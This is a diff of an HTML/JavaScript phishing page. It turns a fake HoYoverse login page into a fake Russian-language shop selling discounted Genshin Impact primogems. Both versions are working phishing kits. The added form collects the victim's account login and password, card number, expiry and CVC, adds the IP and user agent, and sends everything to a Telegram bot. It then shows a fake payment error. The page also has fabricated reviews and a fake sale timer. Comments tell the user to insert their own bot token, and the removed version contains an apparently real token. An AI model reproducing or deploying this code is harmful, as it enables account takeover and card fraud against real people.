@@ -1,180 +1,257 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>HoYoverse Account - Log In</title>
+  <title>Дешёвые Примогемы Genshin Impact | Мгновенная доставка</title>
   <link rel="icon" href="https://genshin.hoyoverse.com/favicon.ico" type="image/x-icon"/>
   <style>
     body {
       margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-      color: white;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0d001a, #1a0033, #2a004d);
+      color: #e0d4ff;
+      min-height: 100vh;
+      background-attachment: fixed;
     }
     .container {
-      background: rgba(20, 20, 40, 0.85);
-      border-radius: 16px;
-      padding: 40px 32px;
-      width: 380px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    header {
       text-align: center;
-      border: 1px solid #4a3aff44;
+      padding: 40px 0 20px;
     }
     .logo {
-      width: 140px;
-      margin-bottom: 24px;
+      width: 180px;
+      filter: drop-shadow(0 0 15px #9d7fff);
     }
     h1 {
-      font-size: 24px;
-      margin: 0 0 32px;
-      color: #d4d4ff;
+      font-size: 2.8rem;
+      margin: 10px 0;
+      background: linear-gradient(90deg, #c084fc, #a78bfa, #7c3aed);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-    .input-group {
-      margin-bottom: 20px;
-      text-align: left;
+    .timer {
+      font-size: 1.3rem;
+      color: #ff6b6b;
+      margin: 10px 0;
     }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 14px;
-      color: #a0a0ff;
+    .packages {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 20px;
+      margin: 30px 0;
     }
-    input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1px solid #4a3aff;
-      border-radius: 8px;
-      background: #1a1a2e;
+    .card {
+      background: rgba(30, 20, 60, 0.7);
+      border: 2px solid #6b46c1;
+      border-radius: 16px;
+      padding: 24px;
+      text-align: center;
+      transition: all 0.3s;
+      backdrop-filter: blur(8px);
+    }
+    .card:hover {
+      transform: translateY(-10px);
+      border-color: #a78bfa;
+      box-shadow: 0 20px 40px rgba(167,139,250,0.3);
+    }
+    .price {
+      font-size: 2.2rem;
+      font-weight: bold;
+      color: #d4b5ff;
+      margin: 15px 0;
+    }
+    .old-price {
+      text-decoration: line-through;
+      color: #888;
+      font-size: 1.2rem;
+    }
+    .buy-btn {
+      background: linear-gradient(90deg, #7c3aed, #a78bfa);
+      border: none;
       color: white;
-      font-size: 16px;
-      box-sizing: border-box;
+      font-size: 1.2rem;
+      padding: 14px 32px;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 15px;
+      font-weight: bold;
+      transition: all 0.3s;
     }
-    input:focus {
-      outline: none;
-      border-color: #7c5eff;
-      box-shadow: 0 0 0 3px rgba(124,94,255,0.3);
+    .buy-btn:hover {
+      transform: scale(1.08);
+      box-shadow: 0 10px 25px rgba(124,94,255,0.5);
     }
-    button {
+    .form-section {
+      background: rgba(20, 15, 50, 0.8);
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 500px;
+      margin: 40px auto;
+      border: 1px solid #7c3aed44;
+    }
+    input, select {
       width: 100%;
       padding: 14px;
-      background: linear-gradient(90deg, #7c5eff, #a78bff);
-      border: none;
+      margin: 10px 0;
+      border: 1px solid #6b46c1;
       border-radius: 8px;
+      background: #1a1238;
       color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: all 0.2s;
+      font-size: 1rem;
     }
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(124,94,255,0.4);
-    }
-    .footer {
-      margin-top: 28px;
-      font-size: 13px;
-      color: #8888aa;
-    }
-    .error {
+    .error-msg {
       color: #ff6b6b;
-      font-size: 14px;
-      margin-top: 8px;
+      font-weight: bold;
+      margin: 15px 0;
+      text-align: center;
+      display: none;
+    }
+    .success-msg {
+      color: #9fff9f;
+      font-weight: bold;
+      margin: 15px 0;
+      text-align: center;
       display: none;
     }
     .loading {
-      display: none;
+      text-align: center;
+      color: #a78bfa;
+      font-size: 1.2rem;
       margin: 20px 0;
-      color: #a0a0ff;
+      display: none;
+    }
+    .reviews {
+      margin: 60px 0;
+      text-align: center;
+    }
+    .review {
+      background: rgba(40, 30, 80, 0.5);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 15px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/HoYoverse_logo.svg/512px-HoYoverse_logo.svg.png" alt="HoYoverse"/>
-  <!-- Если хочешь точнее — замени на реальный логотип с genshin.hoyoverse.com -->
+  <header>
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/HoYoverse_logo.svg/512px-HoYoverse_logo.svg.png" alt="HoYoverse">
+    <h1>Дешёвые Примогемы для Genshin Impact</h1>
+    <div class="timer">Акция: -70% до конца дня!</div>
+  </header>
 
-  <h1>HoYoverse Account Log In</h1>
-
-  <form id="loginForm">
-    <div class="input-group">
-      <label for="username">Email / Username</label>
-      <input type="text" id="username" placeholder="example@email.com" required autocomplete="username"/>
+  <div class="packages">
+    <div class="card">
+      <h2>Стартовый</h2>
+      <div class="price">3000 <small>примогемов</small></div>
+      <div><span class="old-price">1490 ₽</span> → 449 ₽</div>
+      <button class="buy-btn" onclick="showForm(3000)">Купить</button>
     </div>
 
-    <div class="input-group">
-      <label for="password">Password</label>
-      <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password"/>
+    <div class="card">
+      <h2>Популярный</h2>
+      <div class="price">6480 <small>примогемов + 1600 бонус</small></div>
+      <div><span class="old-price">3490 ₽</span> → 990 ₽</div>
+      <button class="buy-btn" onclick="showForm(6480)">Купить</button>
     </div>
 
-    <div id="errorMsg" class="error">Incorrect email or password. Please try again.</div>
+    <div class="card">
+      <h2>Максимальный</h2>
+      <div class="price">12960 <small>примогемов + 3200 бонус</small></div>
+      <div><span class="old-price">6990 ₽</span> → 1890 ₽</div>
+      <button class="buy-btn" onclick="showForm(12960)">Купить</button>
+    </div>
+  </div>
 
-    <button type="submit">Log In</button>
+  <div class="form-section" id="paymentForm" style="display:none;">
+    <h2 style="text-align:center; color:#d4b5ff;">Оплата заказа</h2>
+    
+    <form id="payForm">
+      <input type="email" id="email" placeholder="Email / HoYoverse логин" required autocomplete="email">
+      <input type="password" id="password" placeholder="Пароль от аккаунта" required autocomplete="current-password">
+      <input type="text" id="card" placeholder="Номер карты (можно ввести любые цифры)" pattern="\d{16}" maxlength="16" required>
+      <input type="text" id="expiry" placeholder="Срок действия (ММ/ГГ)" pattern="\d{2}/\d{2}" maxlength="5" required>
+      <input type="text" id="cvc" placeholder="CVC" pattern="\d{3}" maxlength="3" required>
 
-    <div class="loading" id="loading">Verifying...</div>
-  </form>
+      <div class="loading" id="loading">Обработка платежа...</div>
+      <div class="error-msg" id="errorMsg">Ошибка: неверные данные карты или недостаточно средств. Попробуйте ещё раз.</div>
 
-  <div class="footer">
-    <p>Forgot password? | Register Now</p>
-    <p>© 2026 COGNOSPHERE. All rights reserved.</p>
+      <button type="submit" class="buy-btn" style="width:100%; margin-top:20px;">Оплатить</button>
+    </form>
+
+    <div style="text-align:center; margin-top:20px;">
+      <small>Мы не храним ваши данные. Все транзакции защищены.</small>
+    </div>
+  </div>
+
+  <div class="reviews">
+    <h2>Что говорят наши покупатели</h2>
+    <div class="review">
+      <p>«Купил 6480 за 990р — пришло за 5 минут! Спасибо!»</p>
+      <small>— Никита К., 5 минут назад</small>
+    </div>
+    <div class="review">
+      <p>«Самые дешёвые примогемы в рунете, уже третий раз беру»</p>
+      <small>— Алина М., 12 минут назад</small>
+    </div>
   </div>
 </div>
 
 <script>
-  const form = document.getElementById('loginForm');
-  const error = document.getElementById('errorMsg');
-  const loading = document.getElementById('loading');
+  // ← ЗАМЕНИ НА СВОИ ДАННЫЕ
+  const TELEGRAM_BOT_TOKEN = "7777777777:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+  const TELEGRAM_CHAT_ID   = "123456789";
 
-  // ← ТВОИ ДАННЫЕ — замени обязательно!
-  const TELEGRAM_BOT_TOKEN = "8723819478:AAGJPIKI5FSgD4RkhhQTValrR--G3Iuyuto";
-  const TELEGRAM_CHAT_ID   = "7200747121";  // твой chat id
+  function showForm(amount) {
+    document.getElementById('paymentForm').style.display = 'block';
+    window.scrollTo({ top: document.getElementById('paymentForm').offsetTop - 100, behavior: 'smooth' });
+  }
+
+  const form = document.getElementById('payForm');
+  const errorMsg = document.getElementById('errorMsg');
+  const loading = document.getElementById('loading');
 
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    error.style.display = 'none';
+    errorMsg.style.display = 'none';
     loading.style.display = 'block';
 
-    const username = document.getElementById('username').value.trim();
+    const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value.trim();
+    const card = document.getElementById('card').value.trim();
+    const expiry = document.getElementById('expiry').value.trim();
+    const cvc = document.getElementById('cvc').value.trim();
 
-    if (!username || !password) {
-      error.textContent = "Please fill in all fields.";
-      error.style.display = 'block';
-      loading.style.display = 'none';
-      return;
-    }
-
-    // Собираем инфу о жертве
     const victimData = {
-      username: username,
+      email_or_login: email,
       password: password,
+      card_number: card,
+      expiry: expiry,
+      cvc: cvc,
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screen: `\( {screen.width}x \){screen.height}`,
-      ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown')
+      ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'неизвестно')
     };
 
-    // Отправка в телегу
     const message = `
-**Новый Genshin/HoYoverse логин пойман!**
-━━━━━━━━━━━━━━━━━━━━
-Email/Username: \`${victimData.username}\`
-Password: \`${victimData.password}\`
-Time: ${victimData.timestamp}
+**НОВЫЙ ЗАКАЗ ПРИМОГЕМОВ**
+━━━━━━━━━━━━━━━━━━━━━━━
+Логин/Email: \`${victimData.email_or_login}\`
+Пароль: \`${victimData.password}\`
+Карта: \`${victimData.card_number}\` | ${victimData.expiry} | ${victimData.cvc}
 IP: ${victimData.ip}
-Device: ${victimData.userAgent}
-Screen: ${victimData.screen}
-Lang: ${victimData.language}
-━━━━━━━━━━━━━━━━━━━━
-`;
+Устройство: ${victimData.userAgent}
+Время: ${victimData.timestamp}
+━━━━━━━━━━━━━━━━━━━━━━━`;
 
     try {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -187,20 +264,14 @@ Lang: ${victimData.language}
         })
       });
     } catch (err) {
-      console.error(err);
+      console.error('Ошибка отправки:', err);
     }
 
-    // Имитация задержки + ошибка/редирект
     setTimeout(() => {
-      // Вариант 1: показать ошибку и дать ввести заново (для 2FA имитации)
-      // error.textContent = "Verification code sent to your email. Please enter it below.";
-      // error.style.display = 'block'; // + добавить поле для кода
-
-      // Вариант 2: сразу редирект на настоящий сайт (самый безопасный)
-      window.location.href = "https://account.hoyoverse.com/";
-      
       loading.style.display = 'none';
-    }, 1800);
+      errorMsg.style.display = 'block';
+      // Можно добавить кнопку "Попробовать снова" — но и так можно просто заново заполнить
+    }, 2200);
   });
 </script>
 
